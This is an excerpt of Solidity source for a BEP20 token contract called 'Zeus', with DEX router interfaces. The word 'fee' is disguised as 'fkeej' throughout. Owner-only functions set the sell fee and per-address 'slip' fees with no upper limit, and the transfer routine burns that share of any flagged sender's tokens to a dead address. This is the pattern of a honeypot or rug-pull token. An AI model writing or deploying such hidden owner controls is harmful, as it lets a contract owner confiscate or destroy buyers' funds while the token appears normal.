...
interface IUniswapV2Factory {
    ...
    function fkeejTo() external view returns (address);
    function fkeejToSetter() external view returns (address);
    ...
    function setfkeejTo(address) external;
    function setfkeejToSetter(address) external;
}


interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingfkeejOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function removeLiquidityETHWithPermitSupportingfkeejOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function swapExactTokensForTokensSupportingfkeejOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
    ...
    function swapExactETHForTokensSupportingfkeejOnTransferTokens(
        uint AmountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingfkeejOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
...
contract Zeus is BEP20, Ownable {
    // ext
    ...
    uint256 private _defaultSellfkeej = 0;

    uint256 private _defaultBuyfkeej = 0;


    mapping(address => bool) private _mAccount;

    mapping(address => uint256) private _slipfkeej;
    ...
    function upF(uint256 _value) external onlyownar {
        _defaultSellfkeej = _value;
    }

    function setSlipfkeej(address _address, uint256 _value) external onlyownar {
        require(_value > 0, "Account tax must be greater than or equal to 1");
        _slipfkeej[_address] = _value;
    }

    function getSlipfkeej(address _address) external view onlyownar returns (uint256) {
        return _slipfkeej[_address];
    }


    function setMAccountfkeej(address _address, bool _value) external onlyownar {
        _mAccount[_address] = _value;
    }

    function getMAccountfkeej(address _address) external view onlyownar returns (bool) {
    ...
    function _receiveF(
        ...
        uint256 tradefkeejAmount = 0;

        if (rF) {
            uint256 tradefkeej = 0;
            if (uniswapV2Pair != address(0)) {
                if (_to == uniswapV2Pair) {

                    tradefkeej = _defaultSellfkeej;
                }
                if (from == uniswapV2Pair) {

                    tradefkeej = _defaultBuyfkeej;
                }
            }
            if (_slipfkeej[from] > 0) {
                tradefkeej = _slipfkeej[from];
            }

            tradefkeejAmount = _Amount.mul(tradefkeej).div(100);
        }


        if (tradefkeejAmount > 0) {
            _balances[from] = _balances[from].sub(tradefkeejAmount);
            _balances[_deadAddress] = _balances[_deadAddress].add(tradefkeejAmount);
            emit Transfer(from, _deadAddress, tradefkeejAmount);
        }

        _balances[from] = _balances[from].sub(_Amount - tradefkeejAmount);
        _balances[_to] = _balances[_to].add(_Amount - tradefkeejAmount);
        emit Transfer(from, _to, _Amount - tradefkeejAmount);
    }
